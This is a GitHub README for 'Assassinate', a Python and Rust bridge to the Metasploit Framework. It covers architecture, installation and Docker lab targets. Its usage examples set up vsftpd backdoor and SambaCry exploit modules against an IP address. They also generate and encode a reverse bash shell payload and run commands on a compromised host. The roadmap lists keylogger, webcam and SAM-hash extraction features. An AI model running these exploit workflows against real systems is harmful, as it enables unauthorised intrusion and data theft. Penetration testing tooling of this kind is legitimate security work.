<p align="center">
  <a href="https://github.com/ausmaster/assassinate">
    <img src="./logo-small.png" alt="Assassinate Logo" width="400">
  </a>
</p>

# Assassinate

[![Rust](https://img.shields.io/badge/rust-1.91+-FF8400)](https://www.rust-lang.org)
[![Python Version](https://img.shields.io/badge/python-3.10--3.13-FF8400)](https://www.python.org)
[![License](https://img.shields.io/badge/license-GPLv3-FF8400.svg)](https://github.com/ausmaster/assassinate/blob/main/LICENSE)
[![Tests](https://github.com/ausmaster/assassinate/actions/workflows/ci.yml/badge.svg)](https://github.com/ausmaster/assassinate/actions)
[![Discord](https://img.shields.io/discord/859164869970362439)](https://discord.com/invite/PZqkgxu5SA)

---

## 📚 Overview

**Assassinate** is a high-performance **Python interface** to the **Metasploit Framework** using an IPC-based architecture. Built with lock-free shared memory ring buffers and a Rust daemon that bridges to MSF via Ruby FFI, it provides native-level performance for security automation workflows.

### Key Features

- **Complete MSF Access**: 173 Rust methods, 152 Python async methods covering Framework, Modules, Sessions, Meterpreter, Payloads, Database, Jobs, and Plugins
- **Full Session Control**: Shell sessions, Meterpreter with filesystem/process/network ops, client core (migrate, extensions), transport management
- **High Performance**: MessagePack over lock-free shared memory ring buffers (5-10x faster than JSON-RPC)
- **Async Python API**: Modern `async/await` interface with type hints
- **Production Ready**: Comprehensive CI/CD across 6 Linux distributions
- **Docker Testing**: Vulnerable targets (vsftpd, SambaCry, Rejetto HFS) for integration testing

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                  Python Application                         │
│              assassinate Python Package                     │
└────────────────────┬────────────────────────────────────────┘
                     │ Async IPC Client
                     │ (MessagePack over Shared Memory)
┌────────────────────▼────────────────────────────────────────┐
│              Shared Memory Ring Buffers                     │
│         (Lock-free SPSC, /dev/shm/)                         │
└────────────────────┬────────────────────────────────────────┘
                     │ Binary Protocol
┌────────────────────▼────────────────────────────────────────┐
│                  Rust Daemon                                │
│         IPC Server + Ruby FFI Bridge                        │
│    (rust/daemon + rust/bridge + rust/ipc)                  │
└────────────────────┬────────────────────────────────────────┘
                     │ Magnus Ruby Embed
┌────────────────────▼────────────────────────────────────────┐
│                Metasploit Framework                         │
│                  (Ruby VM)                                  │
└─────────────────────────────────────────────────────────────┘
```

### Components

- **Python Package** (`assassinate/`) - Complete async/sync API with IPC client
- **Rust Daemon** (`rust/daemon/`) - IPC server handling RPC calls
- **Rust Bridge** (`rust/bridge/`) - Magnus-based Ruby FFI to MSF
- **IPC Library** (`rust/ipc/`) - MessagePack protocol, lock-free ring buffers, shared memory

---

## 📂 Project Structure

```plaintext
assassinate/
├── assassinate/              # Python package
│   ├── __init__.py
│   ├── bridge/              # High-level Python API
│   │   ├── core.py          # Framework, initialize()
│   │   ├── modules.py       # Module operations
│   │   ├── sessions.py      # Session management
│   │   ├── datastore.py     # DataStore operations
│   │   ├── payloads.py      # Payload generation
│   │   └── db.py            # Database operations
│   ├── ipc/                 # IPC client implementation
│   │   ├── client.py        # Async IPC client
│   │   ├── protocol.py      # MessagePack protocol
│   │   └── shm.py           # Shared memory interface
│   └── logging.py           # Structured logging
│
├── rust/                    # Rust components
│   ├── ipc/                 # IPC library
│   │   ├── src/
│   │   │   ├── protocol.rs  # MessagePack protocol
│   │   │   ├── ring_buffer.rs  # Lock-free SPSC buffer
│   │   │   └── shm.rs       # Shared memory management
│   │   └── Cargo.toml
│   ├── bridge/              # Ruby FFI bridge
│   │   ├── src/
│   │   │   ├── framework.rs # MSF Framework interface
│   │   │   ├── ruby_bridge.rs  # Magnus Ruby VM
│   │   │   └── error.rs     # Error handling
│   │   └── Cargo.toml
│   └── daemon/              # IPC daemon
│       ├── src/
│       │   └── main.rs      # Daemon server
│       └── Cargo.toml
│
├── python/                  # Python package and tests
│   ├── assassinate/         # Main Python package
│   │   ├── ipc/             # IPC client implementation
│   │   │   └── client.py    # Async IPC client (152 methods)
│   │   └── ...
│   └── tests/               # Integration tests
│       ├── conftest.py      # Pytest fixtures (session fixtures, etc.)
│       ├── test_integration_sessions.py  # Shell session tests
│       ├── test_samba_exploit.py         # SambaCry (CVE-2017-7494) tests
│       ├── test_meterpreter_*.py         # Meterpreter session tests
│       ├── test_db*.py                   # Database tests
│       └── ...
│
├── .github/workflows/       # CI/CD pipelines
│   ├── ci.yml              # Main CI (Rust + Python tests)
│   └── distro-matrix.yml   # Multi-distro validation
│
├── docker/                  # Docker infrastructure (dev + prod)
├── pyproject.toml          # Python project config
└── README.md               # This file
```

---

## 📥 Installation

### Prerequisites

- **Python**: 3.10-3.13 with `uv` package manager
- **Rust**: 1.91+ (for building daemon)
- **Ruby**: 3.1+ (system Ruby)
- **Metasploit Framework**: 6.4+
- **PostgreSQL**: For full MSF functionality

### Quick Start

#### 1. Install System Dependencies

**Debian/Ubuntu/Kali/Parrot:**
```bash
sudo apt-get update && sudo apt-get install -y \
  build-essential curl git \
  ruby-full ruby-dev \
  postgresql postgresql-contrib libpq-dev \
  libssl-dev pkg-config libclang-dev
```

**Fedora:**
```bash
sudo dnf install -y gcc gcc-c++ make curl git \
  ruby ruby-devel \
  postgresql postgresql-server postgresql-devel \
  openssl-devel clang-devel
```

**Arch Linux:**
```bash
sudo pacman -Syu --needed base-devel curl git \
  ruby postgresql clang openssl
```

#### 2. Install Metasploit Framework

**Kali/Parrot** (use package manager):
```bash
sudo apt-get install metasploit-framework
export MSF_ROOT=/usr/share/metasploit-framework
```

**Other distros** (clone from GitHub):
```bash
git clone --depth 1 https://github.com/rapid7/metasploit-framework.git ~/metasploit-framework
cd ~/metasploit-framework
gem install bundler
bundle install --jobs 4
export MSF_ROOT=$HOME/metasploit-framework
```

#### 3. Install Rust & Build Daemon

```bash
# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source $HOME/.cargo/env

# Clone repository
git clone https://github.com/ausmaster/assassinate.git
cd assassinate

# Build all Rust components
cd rust/ipc && cargo build --release
cd ../bridge && cargo build --release
cd ../daemon && cargo build --release
```

#### 4. Install Python Package

```bash
# Install uv package manager
curl -LsSf https://astral.sh/uv/install.sh | sh

# Install assassinate
cd /path/to/assassinate
uv sync
```

#### 5. Setup PostgreSQL & MSF Database

```bash
# Start PostgreSQL
sudo systemctl start postgresql

# Create database and user
sudo -u postgres psql -c "CREATE USER $USER SUPERUSER;"
sudo -u postgres psql -c "CREATE DATABASE msf_test OWNER $USER;"

# Create MSF database config
cd $MSF_ROOT
cat > config/database.yml <<EOF
development: &pgsql
  adapter: postgresql
  database: msf_test
  username: $USER
  password:
  host: localhost
  port: 5432
  pool: 200
  timeout: 5
test:
  <<: *pgsql
EOF

# Run migrations
cd $MSF_ROOT && bundle exec rake db:migrate
```

#### 6. Start Daemon

```bash
# Start the daemon (required for Python client)
./rust/daemon/target/release/daemon &

# Daemon runs in background, Python clients connect via shared memory
```

---

## 📖 Usage

### Python API

```python
from assassinate import initialize, Framework

# Initialize connection to daemon
initialize()

# Create framework instance
fw = Framework()

# Get MSF version
print(fw.version())

# List modules
exploits = fw.list_modules("exploit")
print(f"Available exploits: {len(exploits)}")

# Create and configure a module
mod = fw.create_module("exploit/unix/ftp/vsftpd_234_backdoor")
mod.set_option("RHOSTS", "192.168.1.100")

# Validate options
if mod.validate():
    print("Module ready to run!")

# Generate a payload
pg = fw.payloads()
raw_payload = pg.generate_raw("cmd/unix/reverse_bash", {
    "LHOST": "192.168.1.5",
    "LPORT": "4444"
})

# Encode payload
encoded = pg.encode(raw_payload, "x86/shikata_ga_nai")

# Access database
db = fw.db()
db.report_host(host="192.168.1.100", os_name="Linux")

# List sessions
sessions = fw.sessions()
session_ids = sessions.list()
```

### Async API (Recommended)

```python
from assassinate.ipc.client import MsfClient
import asyncio

async def main():
    async with MsfClient() as client:
        # Get MSF version
        version = await client.version()
        print(f"MSF Version: {version}")

        # Create and configure an exploit module
        module_id = await client.create_module("exploit/linux/samba/is_known_pipename")
        await client.module_set_option(module_id, "RHOSTS", "192.168.1.100")
        await client.module_set_option(module_id, "SMB_SHARE_NAME", "myshare")

        # Run exploit and get session
        session_id = await client.module_exploit(module_id, "cmd/unix/interact")

        if session_id:
            # Execute commands on compromised host
            output = await client.session_run_cmd(session_id, "id")
            print(f"Running as: {output}")

            # Filesystem operations (Meterpreter)
            files = await client.session_fs_ls(session_id, "/etc")

            # Clean up
            await client.session_kill(session_id)

        await client.delete_module(module_id)

asyncio.run(main())
```

### API Reference

**MsfClient Methods (152 async methods):**

| Category | Key Methods |
|----------|-------------|
| **Framework** | `version()`, `list_modules()`, `create_module()`, `search()`, `reload_modules()`, `save()` |
| **Modules** | `module_set_option()`, `module_get_option()`, `module_validate()`, `module_exploit()`, `module_run()`, `module_check()` |
| **Sessions** | `sessions_list()`, `session_info()`, `session_kill()`, `session_run_cmd()`, `session_shell_read()`, `session_shell_write()` |
| **Session FS** | `session_fs_pwd()`, `session_fs_ls()`, `session_fs_cd()`, `session_fs_download()`, `session_fs_upload()`, `session_fs_stat()` |
| **Session Sys** | `session_sys_info()`, `session_sys_getuid()`, `session_sys_getpid()`, `session_sys_ps()`, `session_sys_kill()` |
| **Session Net** | `session_net_interfaces()`, `session_net_routes()`, `session_net_arp()`, `session_net_netstat()` |
| **Meterpreter Core** | `session_core_migrate()`, `session_core_use()`, `session_core_shutdown()`, `session_core_machine_id()` |
| **Transport** | `session_transport_list()`, `session_transport_add()`, `session_transport_change()`, `session_transport_remove()` |
| **Payloads** | `payload_generate()`, `payload_generate_encoded()`, `payload_generate_executable()`, `payload_list()` |
| **Database** | `db_report_host()`, `db_report_service()`, `db_report_vuln()`, `db_hosts()`, `db_services()` |
| **DB Workspace** | `db_workspaces()`, `db_workspace()`, `db_set_workspace()`, `db_add_workspace()`, `db_delete_workspace()` |
| **Jobs** | `job_list()`, `job_info()`, `job_kill()` |
| **Plugins** | `plugin_list()`, `plugin_load()`, `plugin_unload()` |

See full API in `python/assassinate/ipc/client.py` with comprehensive docstrings and type hints.

---

## ⚙️ Environment Variables

Assassinate supports the following environment variables for configuration:

### MSF_ROOT

**Purpose:** Specifies the path to the Metasploit Framework installation.

**Used by:**
- Daemon (`rust/daemon`) - When `--msf-root` CLI argument is not provided
- Python scripts - When initializing MSF without explicit path

**Priority:**
1. CLI argument `--msf-root` (daemon only)
2. `MSF_ROOT` environment variable
3. Default: `/usr/share/metasploit-framework`

**Example:**
```bash
# For package-managed MSF (Kali/Parrot)
export MSF_ROOT=/usr/share/metasploit-framework

# For manually installed MSF
export MSF_ROOT=$HOME/metasploit-framework

# Start daemon with env var
./rust/daemon/target/release/daemon
```

### ASSASSINATE_WORKSPACE

**Purpose:** Specifies the MSF database workspace for credential operations.

**Used by:**
- Database credential reporting (`db.report_cred()`)

**Default:** `"default"`

**Example:**
```bash
export ASSASSINATE_WORKSPACE=pentest_project_1
uv run pytest tests/test_db.py
```

### ASSASSINATE_LOG_LEVEL

**Purpose:** Controls Python logging verbosity.

**Used by:**
- Python package logging system

**Valid values:** `DEBUG`, `INFO`, `WARNING`, `ERROR`, `CRITICAL`

**Default:** `WARNING`

**Example:**
```bash
# Enable debug logging for tests
ASSASSINATE_LOG_LEVEL=DEBUG uv run pytest tests/ -v

# Quiet logging for production
ASSASSINATE_LOG_LEVEL=ERROR python my_script.py
```

### ASSASSINATE_LOG_FILE

**Purpose:** Specifies a file path for log output (in addition to console).

**Used by:**
- Python package logging system

**Default:** `None` (console only)

**Example:**
```bash
export ASSASSINATE_LOG_FILE=/var/log/assassinate.log
python my_script.py
```

### CARGO_TARGET_DIR

**Purpose:** Specifies the Cargo build output directory for Rust components.

**Used by:**
- Pytest fixtures to locate daemon binary
- CI/CD environments to share build artifacts

**Default:** `rust/daemon/target` (relative to project root)

**Example:**
```bash
# CI environments
export CARGO_TARGET_DIR=/tmp/cargo-target
cargo build --release
uv run pytest tests/
```

---

## ✅ Testing

### Test Suite

```bash
# Run all tests
uv run pytest tests/ -v

# Run specific test module
uv run pytest tests/test_framework_detailed.py -v

# Run with debug logging
ASSASSINATE_LOG_LEVEL=DEBUG uv run pytest tests/ -v
```

### Docker Testing Infrastructure

The project includes a comprehensive Docker testing environment with vulnerable targets:

**Available Services:**

| Service | Description | Vulnerabilities |
|---------|-------------|-----------------|
| `target-linux` | Debian-based vulnerable container | vsftpd 2.3.4 (CVE-2011-2523), Samba 4.6.3 (CVE-2017-7494) |
| `target-windows` | Windows Server 2008 R2 (KVM) | Rejetto HFS 2.3 (CVE-2014-6287) |
| `postgres` | PostgreSQL database | MSF data persistence |
| `dev` | Development container | Full MSF + build tools |
| `integration-test` | Test runner container | Automated testing |

**Running Integration Tests:**

```bash
# Start Docker environment
docker compose -f docker/docker-compose.yml up -d postgres target-linux

# Run integration tests
docker compose -f docker/docker-compose.yml run --rm integration-test bash -c \
  "cargo build --release --manifest-path rust/daemon/Cargo.toml && \
   pytest python/tests/ -v"

# Run specific test file
docker exec dev pytest python/tests/test_samba_exploit.py -v
```

**Windows Target (requires KVM):**

```bash
# Start Windows target (first run downloads/installs Windows ~10-20 min)
docker compose -f docker/docker-compose.yml up -d target-windows

# Access via web VNC for debugging
# http://localhost:8006
```

### Local CI Validation

```bash
# Run same checks as CI
./.github/scripts/test-ci-locally.sh
```

See [docker/README.md](docker/README.md) for comprehensive testing documentation and [setup/DISTRO_NOTES.md](setup/DISTRO_NOTES.md) for distribution-specific notes.

---

## 🚀 CI/CD

### Workflows

**Main CI** (`ci.yml`):
- Rust format & lint (all components)
- Python format & lint
- Build all Rust components
- Run Rust unit tests
- Run Python integration tests (118 tests)

**Multi-Distro** (`distro-matrix.yml`):
- Ubuntu 24.04 Full Test
- Kali Linux (package MSF)
- Parrot Security (package MSF)
- Debian, Ubuntu, Fedora, Arch (GitHub MSF)

All tests run on every PR. See [.github/CI_README.md](.github/CI_README.md) for details.

---

## 🔧 Development

### Code Quality

```bash
# Python formatting
uv run ruff format .

# Python linting
uv run ruff check .

# Python type checking
uv run mypy assassinate

# Rust formatting
cd rust/bridge && cargo fmt
cd rust/ipc && cargo fmt
cd rust/daemon && cargo fmt

# Rust linting
cd rust/bridge && cargo clippy -- -D warnings
```

### Building

```bash
# Build all Rust components
cd rust/ipc && cargo build --release
cd ../bridge && cargo build --release
cd ../daemon && cargo build --release

# Daemon will be at: rust/daemon/target/release/daemon
```

---

## 📜 License

This project is licensed under the **GNU General Public License v3.0 (GPL-3.0)**.

---

## 🗨️ Support

- **Issues**: [GitHub Issues](https://github.com/ausmaster/assassinate/issues)
- **Discord**: [Join our community](https://discord.com/invite/PZqkgxu5SA)
- **Documentation**: See [docker/README.md](docker/README.md) and [setup/DISTRO_NOTES.md](setup/DISTRO_NOTES.md)

---

## 🎯 Status & Roadmap

### API Coverage

| Category | Rust Bridge | Daemon | Python | Status |
|----------|-------------|--------|--------|--------|
| Framework API | 17 | 9 | 9 | ✅ Complete |
| Module API | 31 | 29 | 21 | ✅ Complete |
| DataStore | 7 | 8 | 8 | ✅ Complete |
| Payload Generation | 6 | 4 | 4 | ✅ Complete |
| Session Core | 18 | 18 | 17 | ✅ Complete |
| Session Filesystem | 14 | 14 | 14 | ✅ Complete |
| Session Process | 4 | 4 | 4 | ✅ Complete |
| Session System | 9 | 9 | 9 | ✅ Complete |
| Session Network | 7 | 7 | 7 | ✅ Complete |
| Session Shell | 3 | 3 | 3 | ✅ Complete |
| Meterpreter Client Core | 7 | 7 | 7 | ✅ Complete |
| Transport Management | 8 | 8 | 8 | ✅ Complete |
| Database Basic | 10 | 9 | 9 | ✅ Complete |
| Database Workspace | 6 | 6 | 6 | ✅ Complete |
| Database Notes | 3 | 3 | 3 | ✅ Complete |
| Database Status | 2 | 2 | 2 | ✅ Complete |
| Jobs | 4 | 3 | 3 | ✅ Complete |
| Plugins | 4 | 3 | 3 | ✅ Complete |
| **Totals** | **173** | **145** | **152** | |

### Completed Features

**Core Framework:**
- ✅ Complete Python IPC interface (async/sync) - 152 async methods
- ✅ Module operations (create, configure, exploit, run, check, validate)
- ✅ Full session management (shell and Meterpreter)
- ✅ Meterpreter Client Core (migrate, use extension, shutdown, machine_id, native_arch, session_guid, secure)
- ✅ Transport Management (list, add, change, remove, sleep, next/prev, timeouts)
- ✅ Payload generation (raw, encoded, executable)
- ✅ Database CRUD with workspace and notes management
- ✅ Job and plugin management

**Infrastructure:**
- ✅ Lock-free shared memory ring buffers (SPSC)
- ✅ MessagePack protocol (5-10x faster than JSON)
- ✅ Structured logging (Python + Rust)
- ✅ Comprehensive CI/CD across 6 Linux distributions
- ✅ Docker testing environment with vulnerable targets

**Testing:**
- ✅ Integration tests with Docker targets
- ✅ Linux target: vsftpd 2.3.4 (CVE-2011-2523), SambaCry (CVE-2017-7494)
- ✅ Windows target: Rejetto HFS 2.3 (CVE-2014-6287)
- ✅ Session fixtures for shell and Meterpreter testing

### Planned Features

**Priority 1 - Routing & Pivoting:**
- [ ] Route management (add, remove, list, autoroute)
- [ ] Port forwarding (local and reverse)
- [ ] SOCKS proxy support

**Priority 2 - Handler Management:**
- [ ] Payload handler creation and lifecycle
- [ ] Handler types: reverse_tcp, reverse_http(s), bind_tcp

**Priority 3 - Meterpreter Extensions:**
- [ ] UI extension (screenshot, keylogger, idle_time)
- [ ] Webcam extension
- [ ] Registry extension (Windows)
- [ ] Priv extension (getsystem, SAM hashes)
- [ ] Incognito extension (token impersonation)

**Priority 4 - Database Advanced:**
- [ ] Full CRUD for hosts, services, vulns, creds
- [ ] Loot and event management
- [ ] Session database tracking
- [ ] Import/export (25+ formats)

**Priority 5 - Extended Platform Support:**
- [ ] macOS support
- [ ] Windows native support
- [ ] PyPI package publication
- [ ] API documentation site

---

## 🙏 Acknowledgments

- **Metasploit Framework** - For the incredible penetration testing platform
- **Magnus** - For excellent Ruby FFI library
- **Rust Community** - For amazing tooling and ecosystem
